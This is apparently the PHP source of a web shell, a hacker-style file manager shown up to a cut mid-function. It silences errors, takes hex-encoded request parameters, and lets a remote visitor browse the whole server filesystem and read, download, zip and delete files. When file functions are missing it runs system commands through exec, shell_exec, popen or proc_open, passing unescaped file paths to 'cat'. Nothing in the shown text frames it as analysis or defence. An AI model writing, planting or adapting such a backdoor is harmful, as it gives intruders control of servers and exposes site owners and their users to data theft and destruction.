<?php
error_reporting(0);
set_time_limit(0);
session_start();

if(function_exists("ini_set"))
	ini_set("error_log", "./err_log");

if(!isset($_SESSION['onRefresh'])) {
	$_SESSION['onRefresh'] = true;
	echo '<script> document.location.reload(true); </script>';
}

class Util {
	public function dPlay($content) {echo $content;}

	function getOs() {
		if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
			return 1;
		else
			return 0;
	}
	
	function getPartition($path) {
		if($this->getOs() == 1) {
			if(($fPos = stripos($path, ":")) === FALSE) {
				$fPos = stripos(__FILE__, ":");
				return substr(__FILE__, 0, $fPos);	
			}else {
				return substr($path, 0, $fPos);		
			}
		}
	}
	
	function setPartition($path) {
		if($this->getOs() == 1) {
			if(stripos($path, ":") === FALSE) {
				return $this->getPartition($path).":".$path;
			}
		}
		
		return $path;
	}
	
	function getSeparator() { 
		if($this->getOs() == 1)
			return "\\";
		else
			return "/";
	}
	
	function setSeparator($path) { 
		if($this->getOs() == 1)
			 return str_replace("/", "\\", $path);
		else
		 	 return str_replace("\\", "/", $path);
	}
	
	function hexToStr($hex) {
		$string = '';
		for ($i=0; $i < strlen($hex)-1; $i+=2) {
			$string .= chr(hexdec($hex[$i].$hex[$i+1]));
		}
		return $string;
	}
	
	function strToHex($string) {
		$hex='';
		for ($i=0; $i < strlen($string); $i++) {
			$hex .= dechex(ord($string[$i]));
		}
		return $hex;
	}
	
	function path_strip($path) {
		$raw = array();
	
		$path = $this->setSeparator($path);
		$path = $this->setPartition($path);
		
		if($this->str_startsWith(".".$this->getSeparator(), $path)) {
			$ppath = explode($this->getSeparator(), dirname(__FILE__));
			$raw = $this->path_strip_pdp($ppath, $raw);
		}
		
		$tpath = explode($this->getSeparator(), $path);
		$raw = $this->path_strip_pdp($tpath, $raw);
		
		if(sizeof($raw) == 0)
			$raw[] = "";
				
		return $raw;
	}
	
	function path_strip_pdp($path, $stack) {
		for($i=($this->getOs()== 1? 0:1); $i<sizeof($path); $i++) {
			if($path[$i] != "" && $path[$i] != ".") {
				if($path[$i] == "..") {
					if(sizeof($stack) > ($this->getOs()== 1? 1:0))
						array_pop($stack);
				}else
					$stack[] = $path[$i];
			}
		}
		
		return $stack;
	}
	
	function is_path_readable($path) {
		if($this->is_this_dir($path) && $this->format_fperms($path, "r") == 'r') {
			return true;	
		}
		return false;
	}
	
	function is_this_dir($path) {
		if($this->format_fperms($path, 't') == 'd') {
			return true;	
		}
		return false;
	}
	
	function is_this_file($path) {
		if($this->format_fperms($path, 't') == 'f') {
			return true;	
		}
		return false;
	}
	
	function is_this_link($path) {
		if($this->format_fperms($path, 't') == 'l') {
			return true;	
		}
		return false;
	}
	
	function is_this_unk($path) {
		if(!$this->is_this_dir($path) && !$this->is_this_file($path) && !$this->is_this_link($path)) {
			return true;
		}
		return false;
	}
	
	function format_fowner($path) {
		if ($this->getOs() == 1) {
			$flowner['name'] = gethostbyaddr($_SERVER['REMOTE_ADDR']);
		}else {
			if(function_exists("posix_getpwuid")) {
				$flowner = posix_getpwuid(fileowner($path));
			}else {
				$flowner['name'] = '??? = '.fileowner($path);
			}
		}
		return $flowner['name'];
	}
	
	function format_fsize($path, $type="0") {
		$size = "";
		$lvl = 0;
		$sz_raw = 0;
		
		if($this->is_this_file($path)) {
			if(function_exists("filesize"))
				$sz_raw = filesize($path);
			else {
				$stock = $this->read_file($path);
				$sz_raw = strlen($stock['content']);
			}
		}else if($this->is_this_link($path)) {
			if($this->format_fperms($path, 't') == 'f' || $this->format_fperms($path, 't') == 'l') {
				$stock = $this->read_link($path);
				$sz_raw = strlen($stock['content']);
			}else {
				return $size;	
			}
		}else {
			$stock = $this->read_unk($path);
			$sz_raw = strlen($stock['content']);
		}
		
		if($type == "1") {
			$size = $sz_raw/(1024^2);
		}else {
			while($sz_raw > 1024) {
				$sz_raw/=1024;
				$lvl++;
			}

			$size .= number_format($sz_raw, 2);
			  
			switch($lvl) {
				case 1: $size .= " Kb"; break;
				case 2: $size .= " Mb"; break;
				case 3: $size .= " Gb"; break;
				case 4: $size .= " Tb"; break;
				default: $size .= " By";
			}
		}
	
		return $size;
	}
	
	function format_fperms($path, $type) {
		$access = '';
		$perms = fileperms($path);

		switch($type) {
			case 'l':
				// Owner
				$access .= (($perms & 0x0100) ? 'r' : '-');
				$access .= (($perms & 0x0080) ? 'w' : '-');
				$access .= (($perms & 0x0040) ? (($perms & 0x0800)?'s':'x') : (($perms & 0x0800)?'S':'-'));
				$access .= " ";
				// Group
				$access .= (($perms & 0x0020) ? 'r' : '-');
				$access .= (($perms & 0x0010) ? 'w' : '-');
				$access .= (($perms & 0x0008) ? (($perms & 0x0400)?'s':'x') : (($perms & 0x0400)?'S':'-'));
				$access .= " ";
				// Others
				$access .= (($perms & 0x0004) ? 'r' : '-');
				$access .= (($perms & 0x0002) ? 'w' : '-');
				$access .= (($perms & 0x0001) ? (($perms & 0x0200)?'t':'x') : (($perms & 0x0200)?'T':'-'));
				break;	
			case 'n':
				$access .= substr(sprintf('%o', $perms), -4);
				break;
			case 's':
				$access .= $this->format_fperms($path, 'r');
				$access .= $this->format_fperms($path, 'w');
				$access .= $this->format_fperms($path, 'x');
				break;
			case 't':
				$tmp_chkA = $this->str_fromArray($this->path_strip($path), $this->getSeparator(), "path");
				$tmp_chkB = $this->str_fromArray($this->path_strip(readlink($path)), $this->getSeparator(), "path");

				if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
					$ext = pathinfo($tmp_chkA, PATHINFO_EXTENSION);
					if($ext == "lnk") {
						$access = 'l';
					}else if(($perms & 0x4000) == 0x4000) {
						$access = 'd';
					}else if(($perms & 0x8000) == 0x8000) {
						$access = 'f';
					}else {
						$access = 'u';
					}
				}else {
					if(strlen($tmp_chkB) > 1) {
						$access = 'l';
					}else if(($perms & 0x4000) == 0x4000) {
						$access = 'd';
					}else if(($perms & 0x8000) == 0x8000) {
						$access = 'f';
					}else{
						$access = 'u';
					}
				}
				break;
			case 'tl':
				if(($perms & 0x4000) == 0x4000) {
					$access = 'd';
				}else if(($perms & 0x8000) == 0x8000) {
					$access = 'f';
				}else {
					$access = 'l';
				}
				break;
			case 'r':
				if(fileowner($path) == fileowner(__FILE__)) $access .= (($perms & 0x0100) ? 'r' : '-');
				else $access .= (($perms & 0x0004) ? 'r' : '-');
				break;
			case 'w':
				if(fileowner($path) == fileowner(__FILE__)) $access .= (($perms & 0x0080) ? 'w' : '-');
				else $access .= (($perms & 0x0002) ? 'w' : '-');
				break;
			case 'x':
				if(fileowner($path) == fileowner(__FILE__)) $access .= (($perms & 0x0040) ? (($perms & 0x0800)?'s':'x') : (($perms & 0x0800)?'S':'-'));
				else $access .= (($perms & 0x0001) ? (($perms & 0x0200)?'t':'x') : (($perms & 0x0200) ?'T':'-'));
				break;
			default: $access .= 'E';
		}
		return $access;	
	}
	
	function str_startsWith($needle, $string) {
		$length = strlen($needle);
		return (substr($string, 0, $length) === $needle);
	}

	function str_endsWith($needle, $string) {
		$pos  = strlen($string) - strlen($needle);
		return (substr($string, $pos) === $needle);
	}
	
	function str_fromArray($stack, $delimiter="", $type="") {
		$string = "";
		for($i=0; $i<sizeof($stack); $i++)
			switch($type) {
				case "path":
					if ($this->getOs() == 1) {
						if($i<sizeof($stack)-1)
							$string .= $stack[$i].$delimiter;
						else 
							$string .= $stack[$i];
					}else {
						$string .= $delimiter.$stack[$i];
					}
					break;
				default:
					if(strlen($string) == 0)
						$string .= $stack[$i];
					else
						$string .= $delimiter.$stack[$i];
			}
			
		return $string;
	}
	
	public function read_file($file) {
		$stock = array();
		$tmp = "";
		if(function_exists("fopen") && ($stream = fopen($file, 'rb')) != false) {
			while(!feof($stream))
				$tmp .= fgets($stream);
			fclose($stream);
			$stock = array('content' => $tmp, 'flag' => 0);
		}else if(function_exists("fopen") && ($stream = file($file)) != false) {
			foreach ($stream as $line)
				$tmp .= $line;
			$stock = array('content' => $tmp, 'flag' => 0);
		}else { $stock = $this->do_through_shell("cat ".$file); }

		return $stock;
	}
	
	public function read_link($file) {
		$stock = array();
		$tmp = "";
		if(function_exists("fopen") && $this->format_fperms($file, 'tl') != 'd' && ($stream = fopen($file, 'rb')) != false) {
			while(!feof($stream))
				$tmp .= fgets($stream);
			fclose($stream);
			$stock = array('content' => $tmp, 'flag' => 0);
		}else if(function_exists("file") && $this->format_fperms($file, 'tl') != 'd' && ($stream = file($file)) != false) {
			foreach ($stream as $line)
				$tmp .= $line;
			$stock = array('content' => $tmp, 'flag' => 0);
		}else if(function_exists("fsockopen") && ($stock = $this->read_through_fsock($file, $this->format_fperms($file, 'tl') == 'd')) != NULL) {
		}else if(function_exists("socket_create") && ($stock = $this->read_through_sock($file, $this->format_fperms($file, 'tl') == 'd')) != NULL){
		}
		else { $stock = $this->do_through_shell("cat ".$file); }
		
		return $stock;
	}
	
	public function read_unk($file) {
		$stock = array();

		if(function_exists("fsockopen") && ($stock = $this->read_through_fsock($file, $this->format_fperms($file, 'tl') == 'd')) != NULL) {
		}else if(function_exists("socket_create") && ($stock = $this->read_through_sock($file, $this->format_fperms($file, 'tl') == 'd')) != NULL){
		}else { $stock = $this->do_through_shell("cat ".$file); }

		return $stock;
	}
	
	public function read_through_fsock($file, $type = 0) {
		$hostname = $_SERVER['SERVER_NAME'];
		$hostport = $_SERVER['SERVER_PORT'];
		$buffer = ""; $content = array();

		if(($fsop = fsockopen($hostname, $hostport, $errno, $errstr, 30)) !== NULL) {
			$fpath = explode($_SERVER['DOCUMENT_ROOT'], $file, 2);
	
			$message = "GET ".$fpath[1].($type?'/':'')." HTTP/1.0\r\n";
			$message .= "Host: ".$hostname."\r\n";
			$message .= "Connection: Close\r\n\r\n";

			fwrite($fsop, $message);
			while (!feof($fsop)) {
				$buffer .= fgets($fsop);
			}
			fclose($fsop);
			$content = explode("\r\n\r\n", $buffer, 2);
		}else 
			return NULL;

		if(sizeof($content) == 2) {
			if(strpos($content[1], "Moved Permanently") !== false && strpos($content[1], "301") !== false) {
				return $this->read_through_fsock($file, 1);
			}
			
			if((strpos($content[1], "Found") !== false || 
				strpos($content[1], "Temporary Redirect") !== false || strpos($content[1], "Permanent Redirect") !== false ||
				strpos($content[1], "Bad Request") !== false || strpos($content[1], "Unauthorized") !== false ||
				strpos($content[1], "Forbidden") !== false || strpos($content[1], "Not Found") !== false || 
				strpos($content[1], "Internal Server Error") !== false || strpos($content[1], "Not Implemented") !== false || 
				strpos($content[1], "Bad Gateway") !== false || strpos($content[1], "Service Unavailable") !== false) &&
				(strpos($content[1], "302") !== false || strpos($content[1], "307") !== false ||
				strpos($content[1], "308") !== false || strpos($content[1], "400") !== false || strpos($content[1], "401") !== false ||
				strpos($content[1], "403") !== false || strpos($content[1], "404") !== false || strpos($content[1], "500") !== false ||
				strpos($content[1], "501") !== false || strpos($content[1], "502") !== false || strpos($content[1], "503") !== false)) {
	
				return NULL;			
			}

			if($type == 1) {
				$content[1] = preg_replace("/(.*[\n]){1,}?(<ul>)|(<li>).*(href\=\")|(\">).*(<\/li>)|(<\/ul>)(.*[\n]|[\n]){1,}/i", "", $content[1]);
			}
		}
		return array('content' => $content[1], 'flag' => $type);
	}
	
	public function read_through_sock($file, $type=0) {
		if(!($sock = socket_create(AF_INET, SOCK_STREAM, 0))) return "";
		
		$hostname = $_SERVER['SERVER_NAME'];
		$hostport = $_SERVER['SERVER_PORT'];

		if(!socket_connect($sock , $hostname, $hostport)) {
			socket_close($sock);
			return "";
		}
		
		$fpath = explode($_SERVER['DOCUMENT_ROOT'], $file, 2);
		
		$message = "GET ".$fpath[1].($type?'/':'')." HTTP/1.0\r\n";
		$message .= "Host: ".$hostname."\r\n";
    	$message .= "Connection: Close\r\n\r\n";

		if(!socket_send($sock , $message, strlen($message), 0)) {
			socket_close($sock);
			return "";
		}

		$buffer = "";
		while(($tmp_buff = socket_read($sock, 1024)) !== NULL) {
			if(strlen($tmp_buff) > 0)
				$buffer .= $tmp_buff;
			else
				break;
		}
		socket_close($sock);
		$content = explode("\r\n\r\n", $buffer, 2);
		
		if(sizeof($content) == 2) {
			if(strpos($content[1], "Moved Permanently") !== false && strpos($content[1], "301") !== false) {
				return $this->read_through_sock($file, 1);
			}
			
			if((strpos($content[1], "Found") !== false || 
				strpos($content[1], "Temporary Redirect") !== false || strpos($content[1], "Permanent Redirect") !== false ||
				strpos($content[1], "Bad Request") !== false || strpos($content[1], "Unauthorized") !== false ||
				strpos($content[1], "Forbidden") !== false || strpos($content[1], "Not Found") !== false || 
				strpos($content[1], "Internal Server Error") !== false || strpos($content[1], "Not Implemented") !== false || 
				strpos($content[1], "Bad Gateway") !== false || strpos($content[1], "Service Unavailable") !== false) &&
				(strpos($content[1], "302") !== false || strpos($content[1], "307") !== false ||
				strpos($content[1], "308") !== false || strpos($content[1], "400") !== false || strpos($content[1], "401") !== false ||
				strpos($content[1], "403") !== false || strpos($content[1], "404") !== false || strpos($content[1], "500") !== false ||
				strpos($content[1], "501") !== false || strpos($content[1], "502") !== false || strpos($content[1], "503") !== false)) {
	
				return NULL;			
			}

			if($type == 1) {
				$content[1] = preg_replace("/(.*[\n]){1,}?(<ul>)|(<li>).*(href\=\")|(\">).*(<\/li>)|(<\/ul>)(.*[\n]|[\n]){1,}/i", "", $content[1]);
			}
		}
		return array('content' => $content[1], 'flag' => $type);
	}
	
	public function do_through_shell($com) {
		$stock = array();
		
		if(function_exists("exec")) {
			$buff = array();
			exec($com, $buff);
			$stock = array('content' => $this->str_fromArray($buff), 'flag' => 0);
		}else if(function_exists("shell_exec")) {
			if(($buff = shell_exec($com)) != NULL)
				$stock = array('content' => $buff, 'flag' => 0);
		}else if(function_exists("popen")) {
			$hdl = popen($com, 'r');
			$buff = "";
			while(($read = fread($hdl, 1024)) != NULL) {
				$buff .= $read;
			}
			pclose($handle);
			$stock = array('content' => $buff, 'flag' => 0);
		}else if(function_exists("proc_open")) {
			$dsc = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("file", "/tmp/error-output.txt", "a"));
			$buff = "";
			$cwd = '/tmp';
			$env = array();
			
			$process = proc_open($com, $dsc, $pipes, $cwd, $env);
			
			if (is_resource($process)) {
				$buff = stream_get_contents($pipes[1]);
				fclose($pipes[1]);

				proc_close($process);
				$stock = array('content' => $buff, 'flag' => 0);
			}	
		}
		
		return $stock;
	}
}

class Query extends Util {
	protected $_TP = "", $_ACT = "", $_VAL = "";
	private $g_VAL = array(), $p_VAL = array();
	
	public function Query() {
		global $_TP, $_ACT, $_VAL, $g_VAL, $p_VAL;
		$_TP = (isset($_GET['tp']) && is_numeric($_GET['tp']) && (int)$_GET['tp']>-1 ? (int)$_GET['tp']:-1);	
		$_ACT = (isset($_GET['act']) && is_string($_GET['act']) ? $_GET['act']:"none");
		$_VAL = (isset($_GET['val']) && is_string($_GET['val']) ? $_GET['val']:"none");	
		
		$raw_VAL = $this->hexToStr($_VAL);
		$e_VAL = explode(";", $raw_VAL);

		foreach($e_VAL as $v_TRIM) {
			$v_Spl = explode(":", $v_TRIM, 2);
			
			if(strlen($v_Spl[0]) > 0) {
				if(sizeof($v_Spl) == 2)
					$g_VAL[$v_Spl[0]] = $v_Spl[1];
				else
					$g_VAL[$v_Spl[0]] = true; 
			}
		}
		
		if(isset($_POST['data'])) {
			$_DATA	= (strlen($_POST['data']) > 0 ? $_POST['data']: "none");
			$arr_data = explode(";", $_DATA);
			
			foreach($arr_data as $pt) {
				$p_DATA = explode(":", $pt, 2);
				
				if(strlen($p_DATA[0]) > 0) {
					if(sizeof($p_DATA) == 2)
						$p_VAL[$p_DATA[0]] = $p_DATA[1];
					else
						$p_VAL[$p_DATA[0]] = "";
				}
			}
		}	
		
		if(isset($_POST['login'])) {
			$_DATA	= (sizeof($_POST['login']) > 0 ? $_POST['login']: "none");
			
			foreach($_DATA as $key => $pt) {
				if($key == 0) {
					$p_VAL['user'] = $pt;
				}else if($key == 1) {
					$p_VAL['pass'] = $pt;
				}else {
					break;
				}
			}
		}	
	}
	
	public function RCV($opt = "") {
		global $_TP, $_ACT;
		if($opt == "tp") {
			return $_TP;
		}else if($opt == "act") {
			return $_ACT;
		}else {
			return $this;	
		}
		
	}
	
	public function GET() {
		global $g_VAL;
		return $g_VAL;
	}
	
	public function POST() {
		global $p_VAL;
		return $p_VAL;
	}
}

class ExPlorer extends Util {
	public function get_chdir($path) {
		$get_path = "";

		if($this->is_path_readable($path)) {
			$get_path = $path;
		}else if($this->is_this_dir($path)) {
			$get_path = $path;
		}else {
			$get_path = dirname(__FILE__);
		}
		
		$raw = $this->path_strip($get_path);
		
		$realPath = "";
		$realLink = '<style type="text/css">a {text-decoration: none} a:hover {text-decoration: underline} </style>
						<a style="text-decoration:none;" href="javascript:void(0);" onclick="exp_xhr(\''.$this->strToHex($this->getSeparator()).'\', \'Explorer\');">
						<font color="white">/Root/</font></a> ';

		for($i=0; $i<sizeof($raw); $i++) {
			$realPath .= (($this->getOs() == 1)?"":$this->getSeparator()).$raw[$i].(($this->getOs()==1)?$this->getSeparator():"");
			$realLink .= '<a href="javascript:void(0);" onclick="exp_xhr(\''.$this->strToHex($realPath).'\', \'Explorer\');"><font color="red">'.(($this->getOs() == 1)?"":$this->getSeparator()).$raw[$i].(($this->getOs() == 1)?$this->getSeparator(): "").'</font></a>';
		}
		$realLink .= ' <a style="text-decoration:none;" href="javascript:void(0);" onclick="exp_xhr(\''.$this->strToHex(dirname(__FILE__)).'\', \'Explorer\');"><font color="white">/Local/</font></a>';
		$realLink .= ' <input type="text" style="text-decoration:none; float:right" 
						onchange="exp_xhr_check(encToHex(this.value), \'Explorer\');"></input>';
		
		$this->dPlay('<table style="border-color:#9F0" bgcolor="#003366" width="100%" border="1"><tr><td style="border-style:groove;"><font color="#9999CC"><b>Path:</b></font>'.$realLink.'</td></tr></table>');

		if($this->is_path_readable($realPath))
			$this->show_chdir($realPath);
	}

	public function show_chdir($loc) {
		$content = "";
		$contStock = array();
		
	
		$contStock = $this->get_dir_contents($loc, 0);
		if(sizeof($contStock) > 0) {
			$content  = '<style>table.hov tr:hover, table.hov tr td:hover{background-color: #404040; }</style>';
			$content .= '<table class="hov" align=center style="border:solid, 1px; border-color:#FFFFFF" bgcolor="#111111" width="100%">
							<tr bgcolor="#303030">
								<td align=center><font color="#FF3300">Directories & Files</font></td>
								<td align="center"><font color="#FF3300">Owner</font></td>
								<td width="80" align="center"><font color="#FF3300">Size</font></td>
								<td align="center" colspan="3"><font color="#FF3300">Access</font></td>
								<td width="1%" align="center"><font color="#FF3300">Zip</font></td>
								<td width="1%" align="center"><font color="#FF3300">Dwn</font></td>
								<td width="1%" align="center"><font color="#FF3300">Del</font></td></tr>';	
			$this->dPlay($content);
			
			$content  = '';
			foreach($contStock as $nfd) {
				$path = $this->str_fromArray($this->path_strip($loc.$this->getSeparator().$nfd), $this->getSeparator(), "path");
				
				$content .= '<tr bgcolor="#000000">
								<td><a style="text-decoration:none;" href="javascript:void(0);" onclick="exp_xhr(\''.$this->strToHex($path).'\', \'Explorer\');"><img alt="" src="data:image/gif;base64,R0lGODlhEAAQANUAAEFBQUBAQD8/Pz4+Pjw8PDs7Ozo6Ojk5OTg4ODc3NzU1NTQ0NDMzMzIyMjExMTAwMC8vLy4uLi0tLSwsLCsrKyoqKikpKSgoKCYmJiUlJSQkJCMjIyIiIiEhISAgIB8fHx4eHh0dHRwcHBsbGxoaGhkZGRgYGBcXFxYWFhUVFRMTExISEhERERAQEA8PDw4ODg0NDQwMDAsLCwoKCgkJCQgICAcHBwYGBgUFBQQEBAMDAwICAgEBAf///wAAAAAAACH5BAEAAD0ALAAAAAAQABAAAAapwJ5wSCwSDQMBYGAkLhqMaCMxIBgOCuKEUulyLeAKhejpfEDokGgNCg1BmktlEoE8Fs8H5dLzgDIXE3YNDgUBBAgKEBciKCIgZR0cHRkSFRYYGx0mKiglIyOPISEaGhwfIiM9LSsqKSgnsSgkIiQmKEIxLy4tLSy/La4qKixCNTQzMzIxzMwvLzAyQjk5ONY41NY32zdCPDs6ODc2NDQ1Njc4OjtN7e7uQQA7" /> <font color="#3366CC">';
									if($nfd == ".") $content .= '.';
									else if($nfd == "..") $content .= '..';
									else $content .= $nfd;
									$content .= '</font></a></td>
								<td width="1%" align="center">'.$this->format_fowner($path).'</td>
								<td width="80"></td>
								<td width="1%" align="center">'.$this->format_fperms($path,"t").'</td>
								<td width="85" align="center">'.$this->format_fperms($path,"l").'</td>
								<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>';
								
									if($nfd != "." && $nfd != "..")
										$content .= '<td width="1%" align="center"><a href="javascript:void(0);"><img alt="" src="data:image/gif;base64,R0lGODlhEAAQAPcAABIRFAAQPgAWTAATQh8+aAAlTwAgRQAxYyxMbAA4bgEfOBA7XhU/ZAdKfg06WwAZKg8xRypokAY7WhNEYA81SxEzRx5BVR45SExrfRU1RCFMYCBGVw0jLCdZbTJebD1pdzBUXwc7Ryc1Nys0NRw0NihTVVF2Z4WjllJ3YUBwUT1XRlJ3XjxiQkZiQ1Z5SUxhQ2R6Vuv34j9OM3OFW/r/87DHhT5GL7vQlYWRbVlmO46oTXF5WjM3JpirR3WCPJCeT+j7jjg8I+//noiLeKW3PYiUPOru019lLcDOPHuCOhobEZicdPL/Oubuh/z/zOzzVPr9I1pbFvz/df//Av//If//JP//KP//NNPSNf//Qv//Q3R0Iv//ZpWUPf//bKSjSf//c///hv//j///pf//rf//1f//4f//8P//8///9//4Dv/6IdfSIauoIeHaLaupL5+cR4+NRezpkN3QAP/yBv/zDMvCJ+PZLjMxDJaQJ2lmKfDpYW9sL1hWLcK/duDNANLCAXtzBLyvCv/tFpqPDlxXFG9pJv/4m+nTFuLMF7KkHPjjKe/fN4R+QOfLAPXaFuzUF6KQFu/WJcy3IIp8GZKFIe7MAJuEBvPTDJWACffYE6SND7ehHJeEHb2oJkU9EKaWLq2dNe7jpL2dAKuPCHJgCa2UEcitHOm/AFFBADUqBEA2EllEAE4/EP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAK8ALAAAAAAQABAAAAjjAF8JHEiwYMEolEgpYqTpzhODLE7UaONIjSVUbpzgeDCwRQwyVKYwEdIEC6Y6PRJMELikDB0oQGiguZGixBsrKxwIHHLojxRXRlyEONDAxKIkAwTuEAVIjJkiEiJ00KDiVA4BrzLZgSMoTJotFj5kqPCCkw8ij15dSkUIzBk+F0Ao2PBjUqJBAgGoKnWFyxECDCjoyCJpUxCBPPy0YjWHDQwUSKogMiUjwEA5oQyBGgVJy5o8fSqRKBjJi6tGer7YKDDDk8FVe8Z0QbDAAIQ4nQy+KhQIDwYPHJR80k1whAjdAQEAOw==" onclick="exp_zip_this(\''.$this->strToHex($path).'\', \'zip\', \''.$this->strToHex($loc).'\');"></a></td>';
									else
										$content .= '<td width="1%" align="center"></td>';
								
									$content .= '<td width="1%" align="center"></td>
								<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="exp_delete_this(\''.$this->strToHex($path).'\', \'rmdir\', \''.$this->strToHex($loc).'\');"></a></td></tr>';	
			}
			$this->dPlay($content);

			$contStock = $this->get_dir_contents($loc, 1);
			$content  = '';
			foreach($contStock as $nfd) {
				$path = $this->str_fromArray($this->path_strip($loc.$this->getSeparator().$nfd), $this->getSeparator(), "path");
				$content .= '<tr bgcolor="#111111">
									<td><a style="text-decoration:none;" href="javascript:void(0);" onclick="exp_xhr_file(\''.$this->strToHex($path).'\');"><img alt="" src="data:image/gif;base64,R0lGODlhEAAQAOYAAD09Pu3t7+vr7a+vsWdnaP39/vn5+vX19vPz9PDw8e/v8O7u7+3t7uzs7erq6+np6ujo6ebm56enqOvs8NjZ3N/h5fz9//b3+fHy9OPk5uDh493e4Nzd39XW2EZHSOLl6PDy9Ofp6+bo6t/h49rc3tja3NTW2KeoqX5/gPv8/fDx8u3u7+zt7uvs7err7Ofo6eTl5uDh4t/g4d7f4La3uLGys/X4+uXo6uPm6N/i5Obo6eTm5+Pl5trc3fH09eHk5f3///7///z9/fDx8enq6t7f39zd3bq7u7a3t7CxsZ+goJiZmZOMgYB9ecPCwf////7+/v39/fPz8+vr6729vbu7u7W1taqqqqWlpQwMDAkJCQcHBwUFBQICAgEBAf///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAAF8ALAAAAAAQABAAAAehgF+Cg4SFhRUfNyEhIjg5QIYgJhQkHBwkJR0+hjY9MzIxMTIbJU8oXoRBGj88OzsZI08nWoVPMC9EU1M6UUtZALUQLiwrLE9JXDSGTy4MCkNREl1XT8stCwlQWFtWTxfLDQFQVVtKRgMWyw5QNVwER0gP1bVPTl0eVEUFUvOETxhMmsQQYmAFg36DnkSI8OTJARUIBCAU1LBiwxQTDGnUGAgAOw==" />	<font color="#666699"> '.$nfd.'</font></a></td>
									<td width="1%" align="center">'.$this->format_fowner($path).'</td>
									<td align="right">'.$this->format_fsize($path).'</td>
									<td width="1%" align="center">'.$this->format_fperms($path, "t").'</td>
									<td align="center">'.$this->format_fperms($path, "l").'</td>
									<td width="1%" align="center">'.$this->format_fperms($path,"s").'</td>
									<td width="1%" align="center"></td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAABfUlEQVQ4y6WTv0tCURzFvwW9LCwpf9QS0Q8lcAmSGhoKBAuEVLBXm0PgUEIFQWEQ0hJNubi0tLb3B0RF1hINUkNbSW3vPTEaXPp2zyVDMbqBDz68wznf7+G+C4+YmZqh4Rk7IVNgfb9rkR6pHt8xWWec4/PP0zrgIVMWeHNkZisrnK7M8V5lQQIND5myYPSIzMOyzjulIO+W5iXQ8JApC4YOyNx/i/BmcZq3ijMSaHjIlAWDGTIzTyFeexjn1GNAAg0PmbJgYJus1J2f49dOXsp7JNDwkDUsaH7S+jfI6Fsnq8rqrZ/1C1Fw6ZZAw6udwQ52ZYltkpzupDh6IcggemXjxXwv6zcuCTS8ao5Z7NSdxDZBDleCjOVCL4fvWzlW6OK40AAaHjLMYPbX728bJkePTkby1cvhZ40jL3YJNDxkmPnzEjHQHSMj/THLoTJJoOEpl2tL7GEyspxgAP2f5Q6BR+ATTLVoFOsM0jsQOiq8gGBEgMtr/9lq9nf+AkHZVZaWnYt4AAAAAElFTkSuQmCC" onclick="ext_download_this(\''.$this->strToHex($path).'\', \'download\');"></a></td>
									<td width="1%" align="center"><a href="javascript:void(0);"><img src="data:image/gif;base64,R0lGODlhEAAQANU/AP14Y/1zXfXb2v+cfdtlWf+mnPglHPhCMvRQPflbTfCqpfcpI/uKdftSQftNPf+5sfpmVv/h3ehoUfpzYfpvXeRyWv1vXPW1r+5fSNmLifp3ZPlGN/cfGft+av+zqumalv+glfm1r+KWk/t9cP5iUfpnWPpsW/1qWfuBbfJnUfuXgOZrYd1VSfpfR/RNOfyxjv2Vd/xfUPlANPqEcP+Mf/ppWfxuWPuRe/yti8lVTspXUPlhUvJhTPtnVPt0YP///yH5BAEAAD8ALAAAAAAQABAAAAaRwJ9wSCwOIxZP0QOIECOnTuAxfAAYFqcwFtMwpj+rakYhDUGOktdCC9xQkwaIWHBAJhpfR0NpFIx1CRAmNTt+RkIjBguMBiOIPyEHBhyUBhshRhcuGzINLQ0yGwgXRAo8Nj0AGCsYAD02KQpDLDADAxIfPx8StwMEQwIEOBUiQyIVLwQCRAI5GUUZOsyQ1daIQQA7" onclick="exp_delete_this(\''.$this->strToHex($path).'\', \'rmfile\', \''.$this->strToHex($loc).'\');"></a></td></tr>';	
			}
			$this->dPlay($content);

			$contStock = $this->get_dir_contents($loc, 2);
			$content  = '';
			foreach($contStock as $nfd) {
				$path = $this->str_fromArray($this->path_strip($loc.$this->getSeparator().$nfd), $this->getSeparator(), "path");
	
				$content .= '<tr bgcolor="#050505">
